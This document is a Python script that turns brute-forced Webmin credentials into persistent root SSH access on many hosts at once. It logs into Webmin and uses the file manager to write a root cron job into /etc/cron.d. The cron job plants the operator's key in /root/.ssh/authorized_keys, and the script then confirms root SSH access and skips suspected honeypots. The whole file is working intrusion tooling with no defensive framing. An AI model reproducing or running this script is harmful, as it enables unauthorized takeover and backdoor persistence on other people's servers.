#!/usr/bin/env python3
"""Finalize Webmin credential hits into real, strictly-proven SSH access.

Input : JSON list of {"host": "ip:10000", "user": "root", "pw": "..."}  (wm_brute output)
Steps : login (dashboard proof) -> write /etc/cron.d key via filemin
        -> wait -> SSH with our key -> STRICT proof:
             key present in authorized_keys AND wrong key rejected
Output: /tmp/finalized.json
"""
import sys, os, json, re, time, subprocess, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests, urllib3
urllib3.disable_warnings()

KEY = os.environ.get("KOPS_KEY_FILE", "/tmp/kops_key")
PUB = open(KEY + ".pub").read().strip()
WRONG = "/tmp/wrong_key"
T = 12
UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/126 Safari/537.36"}
DASH = ("webmin_logout", "system-status", "index.cgi?x=", "Webmin version")

CRON = ("* * * * * root mkdir -p /root/.ssh && chmod 700 /root/.ssh && "
        "(grep -qF 'kops@base' /root/.ssh/authorized_keys 2>/dev/null || echo '%s' >> /root/.ssh/authorized_keys) && "
        "chmod 600 /root/.ssh/authorized_keys\n" % PUB)

def login(host, user, pw):
    base = "https://" + host
    s = requests.Session(); s.verify = False
    s.headers.update({**UA, "Referer": base + "/"})
    s.get(base + "/", timeout=T, allow_redirects=False)
    s.get(base + "/session_login.cgi", timeout=T)
    s.post(base + "/session_login.cgi", data={"user": user, "pass": pw, "save": "1"},
           headers={"Referer": base + "/session_login.cgi",
                    "Content-Type": "application/x-www-form-urlencoded"},
           timeout=T, allow_redirects=True)
    s.headers["Referer"] = base + "/"
    return (s, base) if s.cookies.get("sid") else (None, None)

def dash_ok(s, base):
    try:
        r = s.get(base + "/", timeout=T)
        t = r.text or ""
        if "session_login" in t and 'name="pass"' in t:
            return False
        return any(x in t for x in DASH)
    except Exception:
        return False

def stage(rec):
    host = rec["host"]; out = dict(rec)
    try:
        s, base = login(host, rec["user"], rec["pw"])
        if not s:
            out["verdict"] = "LOGIN_FAIL"; return out
        if not dash_ok(s, base):
            out["verdict"] = "NO_DASHBOARD"; return out
        out["dash"] = True
        s.headers["Referer"] = base + "/filemin/"
        w = s.post(base + "/filemin/save_file.cgi",
                   data={"path": "/etc/cron.d/kops", "data": CRON}, timeout=25)
        out["cron_code"] = w.status_code
        rb = s.get(base + "/filemin/edit_file.cgi?path=/etc/cron.d/kops", timeout=25)
        out["cron_verify"] = ("kops@base" in (rb.text or "")) or ("root mkdir" in (rb.text or ""))
        out["verdict"] = "KEY_WRITTEN" if out["cron_verify"] else "KEY_FAIL"
    except Exception as e:
        out["verdict"] = "ERR"; out["err"] = str(e)[:60]
    return out

def ssh_run(key, ip, cmd, timeout=10):
    try:
        p = subprocess.run(["ssh", "-i", key, "-o", "StrictHostKeyChecking=no",
                            "-o", "UserKnownHostsFile=/dev/null", "-o", "LogLevel=ERROR",
                            "-o", f"ConnectTimeout={timeout}", "-o", "BatchMode=yes",
                            f"root@{ip}", cmd], capture_output=True, text=True, timeout=timeout + 6)
        return (p.stdout or "").strip(), (p.stderr or "").strip()
    except Exception as e:
        return "", str(e)[:60]

def strict_proof(rec):
    ip = rec["host"].rsplit(":", 1)[0]
    out = dict(rec)
    o, e = ssh_run(KEY, ip, "grep -c kops@base /root/.ssh/authorized_keys 2>/dev/null; hostname; uname -r")
    lines = [l for l in o.splitlines() if l.strip()]
    keycount = lines[0] if lines else "0"
    out["key_count"] = keycount
    out["hostname"] = lines[1] if len(lines) > 1 else None
    out["kernel"] = lines[2] if len(lines) > 2 else None
    w, _ = ssh_run(WRONG, ip, "id -u")
    out["wrong_key"] = "ACCEPTED" if w.strip() == "0" else "REJECTED"
    try:
        kc = int(keycount or 0)
    except Exception:
        kc = 0
    if kc >= 1 and out["wrong_key"] == "REJECTED":
        out["FINAL"] = "REAL_SSH_ROOT"
    elif out["wrong_key"] == "ACCEPTED":
        out["FINAL"] = "HONEYPOT"
    else:
        out["FINAL"] = "WEBMIN_ONLY"
    return out

def main():
    path = sys.argv[1]
    recs = json.load(open(path))
    if isinstance(recs, dict):
        recs = [r for r in (recs.get("results") or []) if r.get("PROVEN")]
    print("input records:", len(recs), flush=True)
    staged = []
    with ThreadPoolExecutor(max_workers=60) as ex:
        for f in as_completed([ex.submit(stage, r) for r in recs]):
            r = f.result(); staged.append(r)
            if r.get("dash"):
                print(f"  dash OK {r['host']} {r.get('verdict')}", flush=True)
    good = [r for r in staged if r.get("verdict") == "KEY_WRITTEN"]
    print("key written:", len(good), flush=True)
    if good:
        print("waiting 70s for cron...", flush=True)
        time.sleep(70)
    final = []
    with ThreadPoolExecutor(max_workers=40) as ex:
        for f in as_completed([ex.submit(strict_proof, r) for r in good]):
            r = f.result(); final.append(r)
            if r.get("FINAL") == "REAL_SSH_ROOT":
                print(f"🔥 REAL {r['host']} {r.get('hostname')} {r.get('kernel')}", flush=True)
            elif r.get("FINAL") == "HONEYPOT":
                print(f"⛔ HONEYPOT {r['host']}", flush=True)
    json.dump({"staged": staged, "final": final}, open("/tmp/finalized.json", "w"), indent=1)
    real = [r for r in final if r.get("FINAL") == "REAL_SSH_ROOT"]
    print(f"\nDONE input={len(recs)} key_written={len(good)} REAL_SSH={len(real)}", flush=True)

if __name__ == "__main__":
    main()
